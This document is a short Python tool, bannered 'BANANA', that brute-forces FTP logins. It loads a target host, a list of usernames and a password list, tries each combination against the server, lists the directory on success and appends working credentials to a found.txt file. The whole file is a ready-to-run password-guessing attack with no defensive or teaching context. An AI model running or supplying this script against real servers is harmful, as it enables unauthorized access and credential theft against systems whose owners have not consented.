from ftplib import FTP
import os
import sys

# ANSI yellow
YELLOW = "\033[93m"
RESET = "\033[0m"

# ASCII Banner
banner = f"""
{YELLOW}
██████╗  █████╗ ███╗   ██╗ █████╗ ███╗   ██╗ █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗████╗  ██║██╔══██╗
██████╔╝███████║██╔██╗ ██║███████║██╔██╗ ██║███████║
██╔══██╗██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║██╔══██║
██████╔╝██║  ██║██║ ╚████║██║  ██║██║ ╚████║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
{RESET}
"""

print(banner)

try:
    with open("host.txt", "r") as f:
        host = f.readline().strip()
except:
    host = input("Enter FTP host: ")

try:
    with open("usernames.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
except:
    usernames = [input("Enter username: ")]

print("\n[?] Password list options:")
print("1) Use default (passwords.txt)")
print("2) Use custom passlist")

choice = input("Select option (1/2): ")

if choice == "1":
    pass_file = "passwords.txt"
elif choice == "2":
    pass_file = input("Enter path to your passlist: ")
else:
    print("[!] Invalid choice.")
    sys.exit()

if not os.path.exists(pass_file):
    print("[!] Password file not found!")
    sys.exit()

with open(pass_file, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

for username in usernames:
    for password in passwords:
        try:
            ftp = FTP(host, timeout=5)
            ftp.login(user=username, passwd=password)

            print(f"\n[+] SUCCESS: {username}:{password}\n")
            ftp.retrlines("LIST")
            ftp.quit()

            with open("found.txt", "a") as out:
                out.write(f"{username}:{password}\n")

            sys.exit()

        except:
            print(f"[-] FAIL: {username}:{password}")

print("\n[!] No valid credentials found.")
